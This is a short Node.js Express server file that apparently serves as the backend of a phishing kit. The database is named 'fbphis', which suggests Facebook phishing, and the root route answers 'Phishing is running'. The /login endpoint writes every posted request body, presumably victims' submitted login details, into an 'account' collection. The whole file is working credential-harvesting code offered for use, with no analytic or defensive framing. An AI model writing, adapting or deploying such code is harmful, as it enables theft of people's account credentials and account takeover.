const express = require("express");
const dotenv = require("dotenv");
const jwt = require("jsonwebtoken");
const cors = require("cors");
const { MongoClient } = require("mongodb");

const app = express();
const port = process.env.PORT || 5000;

dotenv.config();
app.use(cors());
app.use(express.json());

const uri = process.env.MONGODB_URI; // Update with your MongoDB URI
const client = new MongoClient(uri, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

async function run() {
  try {
    await client.connect();
    console.log("Connected to MongoDB");

    const db = client.db("fbphis"); // Specify your database name
    const accountCollection = db.collection("account");

    app.post("/login", async (req, res) => {
      try {
        const request = req.body;
        const result = await accountCollection.insertOne(request);
        res
          .status(201)
          .json({ success: true, message: "Data inserted successfully" });
      } catch (error) {
        console.error("Error inserting data:", error);
        res.status(500).json({ success: false, message: "An error occurred" });
      }
    });

    app.get("/", (req, res) => {
      res.send("Phishing is running");
    });

    app.listen(port, () => {
      console.log(`Server running on port ${port}`);
    });
  } catch (error) {
    console.error("Error connecting to MongoDB:", error);
  }
}

run();
